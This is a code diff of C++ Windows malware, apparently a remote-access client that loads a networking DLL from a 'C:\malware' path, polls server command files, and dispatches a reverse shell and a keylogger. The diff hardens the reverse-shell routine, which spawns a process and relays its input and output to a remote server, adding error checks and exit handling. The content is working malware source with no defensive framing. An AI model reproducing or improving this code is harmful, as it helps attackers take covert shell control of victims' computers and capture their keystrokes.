@@ -15,19 +15,20 @@ SendDataFunc send_data;
 RecvDataFunc receive_data;
 RecvDataRawFunc receive_data_raw;
 
-LPCWSTR dllPath = L"network_lib.dll";
+LPCWSTR dllPath = L"C:\\malware\\Dependencies\\Networking\\network_lib.dll";
 HINSTANCE hDLL;
 ///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
 
 HANDLE hChildStdOutRead, hChildStdOutWrite;                                     // stdout
 HANDLE hChildStdInRead, hChildStdInWrite;                                       // stdin
 bool connected = false;
+bool outerloop = true; bool loop = true;
 
 /////////////////////////////////////////////////////////////////////////////////////////////////////////////////
 
 bool ExecuteCommand(const std::string& command);
 void give_command(const std::string &command);
-void rev_shell();
+bool rev_shell();
 
 /////////////////////////////////////////////////////////////////////////////////////////////////////////////////
 
@@ -58,7 +59,6 @@ int main()
 {
     load_dll();
 
-    bool outerloop = true;
     while(outerloop)
     {
 
@@ -72,7 +72,6 @@ int main()
 
         //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
 
-        bool loop = true;
         while(loop)
         {
             if(receive_data("from_server.txt")[0] == '`')
@@ -90,7 +89,16 @@ int main()
                     {
                         send_data("from_server.txt","`");                                                    //mark the file read(switch)
                         
-                        rev_shell();
+                        if(!rev_shell())
+                        {
+                            std::cerr << "Failed to establish reverse shell." << std::endl;
+                            loop = false;
+                            outerloop = false;
+                        }
+                        else
+                        {
+                            //std::cout << "Reverse shell established." << std::endl;
+                        }
                         break;
                     }
                     case '4':                                                                                     //keylogger
@@ -193,20 +201,27 @@ void give_command(const std::string &command)
     FlushFileBuffers(hChildStdInWrite); // Ensure the command is sent.
 }
 
-void rev_shell()
+bool rev_shell()
 {
-
     SECURITY_ATTRIBUTES saAttr = {0};
     saAttr.nLength = sizeof(SECURITY_ATTRIBUTES);
     saAttr.bInheritHandle = TRUE;
 
     // Create pipes for child process's STDOUT.
-    CreatePipe(&hChildStdOutRead, &hChildStdOutWrite, &saAttr, 0);
-    SetHandleInformation(hChildStdOutRead, HANDLE_FLAG_INHERIT, 0);
+    if (!CreatePipe(&hChildStdOutRead, &hChildStdOutWrite, &saAttr, 0) ||
+        !SetHandleInformation(hChildStdOutRead, HANDLE_FLAG_INHERIT, 0))
+    {
+        std::cerr << "Failed to create or set up stdout pipe." << std::endl;
+        return 0;
+    }
 
     // Create pipes for child process's STDIN.
-    CreatePipe(&hChildStdInRead, &hChildStdInWrite, &saAttr, 0);
-    SetHandleInformation(hChildStdInWrite, HANDLE_FLAG_INHERIT, 0);
+    if (!CreatePipe(&hChildStdInRead, &hChildStdInWrite, &saAttr, 0) ||
+        !SetHandleInformation(hChildStdInWrite, HANDLE_FLAG_INHERIT, 0))
+    {
+        std::cerr << "Failed to create or set up stdin pipe." << std::endl;
+        return 0;
+    }
 
     STARTUPINFOW si = {0};
     si.cb = sizeof(si);
@@ -221,14 +236,12 @@ void rev_shell()
     if (!CreateProcessW(NULL, command, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi))
     {
         std::cerr << "CreateProcess failed with error code: " << GetLastError() << std::endl;
-        //return 1;
+        return 0;
     }
 
     // Close handles not needed by the parent.
     CloseHandle(hChildStdOutWrite);
     CloseHandle(hChildStdInRead);
-
-    ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
 
     std::atomic<bool> processFinished(false);
     
@@ -252,12 +265,13 @@ void rev_shell()
             } 
             else if (GetLastError() == ERROR_BROKEN_PIPE)
             {
-                // End of data
-                break;
+                std::cerr << "Broken pipe." << std::endl;
+                loop = false; outerloop = false;
+                processFinished.store(true);
             }
 
             Sleep(500); // Sleep for a short time to prevent 100% CPU usage
-        } 
+        }
     });
 
     // Lambda to handle writing to child process's stdin
@@ -266,12 +280,10 @@ void rev_shell()
         std::string cmd;
         while (!processFinished.load())  // Check if process is finished
         {
-
             Sleep(500);
 
             if(receive_data("from_server.txt")[0] == '`')
             {
-                //cout<< "waiting for rev shell data " << endl;
                 continue;
             }
             
@@ -279,19 +291,20 @@ void rev_shell()
             send_data("from_server.txt","`");
             if (cmd == "exit")
             {
+                if(!send_data("from_client.txt","`"))
+                {
+                    // std::cerr << "Failed to send data to server." << std::endl;
+                    loop = false; outerloop = false;
+                    processFinished.store(true);
+                }
                 processFinished.store(true); // Signal to stop reading thread
-                //std::cout << "Exiting..." << std::endl;
-                send_data("from_client.txt","`");
                 break;
             }
 
             // Send the command to the child process's stdin
             give_command(cmd);
-           
         }
     });
-
-    /////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
 
     // Wait for process threads to finish
     writeThread.join();
@@ -312,4 +325,5 @@ void rev_shell()
     CloseHandle(pi.hProcess);
     CloseHandle(pi.hThread);    
 
+    return 1;
 }
